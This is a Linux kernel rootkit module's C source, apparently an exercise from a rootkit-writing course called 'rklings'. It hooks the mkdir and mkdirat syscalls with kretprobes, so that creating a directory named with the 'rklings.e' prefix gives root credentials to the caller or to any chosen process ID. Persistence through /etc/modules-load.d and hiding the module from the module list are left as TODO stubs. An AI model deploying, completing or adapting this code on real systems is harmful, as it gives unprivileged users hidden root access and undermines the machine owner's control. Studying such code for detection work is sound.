// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX      "rklings."
#define RK_PREFIX_LEN  8
#define RK_PATH_MAX    128
#define RK_CMD_MAX     16
#define PERSIST_PATH   "/etc/modules-load.d/rklings.conf"
#define MODULE_NAME_STR "rklings"

/* Command dispatch (function pointer registry) */

typedef int (*rk_handler_t)(const char *arg);

struct rk_cmd_entry {
	const char *key;
	rk_handler_t handler;
};

static struct rk_cmd_entry registry[RK_CMD_MAX];
static int nr_cmds;

static int rk_cmd_register(const char *key, rk_handler_t handler)
{
	if (nr_cmds >= RK_CMD_MAX)
		return -ENOSPC;
	registry[nr_cmds].key = key;
	registry[nr_cmds].handler = handler;
	nr_cmds++;
	return 0;
}

static int rk_dispatch(const char *name)
{
	const char *suffix = name + RK_PREFIX_LEN;
	const struct rk_cmd_entry *best = NULL;
	int best_len = 0;
	int i;

	for (i = 0; i < nr_cmds; i++) {
		int klen = strlen(registry[i].key);

		if (strncmp(suffix, registry[i].key, klen) != 0)
			continue;
		if (suffix[klen] != '\0' && suffix[klen] != '.')
			continue;
		if (klen > best_len) {
			best = &registry[i];
			best_len = klen;
		}
	}

	if (!best)
		return -ENOENT;

	if (suffix[best_len] == '.')
		return best->handler(suffix + best_len + 1);
	return best->handler(NULL);
}

/* Credential escalation (from L09) */

static unsigned int escalation_count;
static int deferred_pid;

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	escalation_count++;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	escalation_count++;
	return 0;
}

static int rk_try_deferred(void)
{
	int ret;

	if (deferred_pid <= 0)
		return 0;
	ret = rk_escalate_pid(deferred_pid);
	if (ret == 0)
		deferred_pid = 0;
	return ret;
}

/* Persistence */

// TODO: rk_persist (filp_open + kernel_write PERSIST_PATH)
static int rk_persist(void)
{
	return -ENOSYS;
}

// TODO: rk_unpersist (truncate PERSIST_PATH)
static int rk_unpersist(void)
{
	return -ENOSYS;
}

/* Module hiding */

static struct list_head *saved_prev;

// TODO: rk_module_hide (list_del THIS_MODULE)
static void rk_module_hide(void)
{
}

// TODO: rk_module_unhide (list_add to saved_prev)
static void rk_module_unhide(void)
{
}

/* Command handlers */

static int cmd_ping(const char *arg)
{
	pr_info("rklings: pong\n");
	return 0;
}

static int cmd_status(const char *arg)
{
	pr_info("rklings: alive, escalations=%u, deferred=%d\n",
		escalation_count, deferred_pid);
	return 0;
}

static int cmd_escalate(const char *arg)
{
	int pid;

	if (!arg)
		return rk_escalate();
	if (kstrtoint(arg, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;
	deferred_pid = pid;
	return 0;
}

// TODO: cmd_persist, cmd_unpersist, cmd_hide_module, cmd_unhide_module
// (one-liner wrappers, register in rk_init)

/* Mkdir interception (from L09) */

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_do_entry(struct kretprobe_instance *inst,
		       const char __user *pathname)
{
	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data->intercepted = false;
	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(base);
	data->intercepted = true;
	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_entry(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_entry(inst, (const char __user *)uregs->di);
}

static int rk_mkdirat_entry(struct kretprobe_instance *inst,
			    struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;

	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler = rk_mkdir_entry,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

static struct kretprobe rk_mkdirat_probe = {
    .kp.symbol_name = "__x64_sys_mkdirat",
    .entry_handler = rk_mkdirat_entry,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

/* Proc interface */

static int rk_proc_show(struct seq_file *m, void *v)
{
	rk_try_deferred();
	if (deferred_pid > 0)
		seq_printf(m, "deferred: %d\n", deferred_pid);
	else
		seq_puts(m, "idle\n");
	seq_printf(m, "escalations: %u\n", escalation_count);
	return 0;
}

static int __init rk_init(void)
{
	int ret;

	rk_cmd_register("ping", cmd_ping);
	rk_cmd_register("status", cmd_status);
	rk_cmd_register("e", cmd_escalate);

	// TODO: register persist, unpersist, h.m, u.m commands

	ret = register_kretprobe(&rk_mkdir_probe);
	if (ret)
		return ret;
	ret = register_kretprobe(&rk_mkdirat_probe);
	if (ret) {
		unregister_kretprobe(&rk_mkdir_probe);
		return ret;
	}
	proc_create_single("rklings", 0444, NULL, rk_proc_show);
	return 0;
}

static void __exit rk_exit(void)
{
	rk_module_unhide();
	remove_proc_entry("rklings", NULL);
	unregister_kretprobe(&rk_mkdirat_probe);
	unregister_kretprobe(&rk_mkdir_probe);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings persistence and module cloaking");
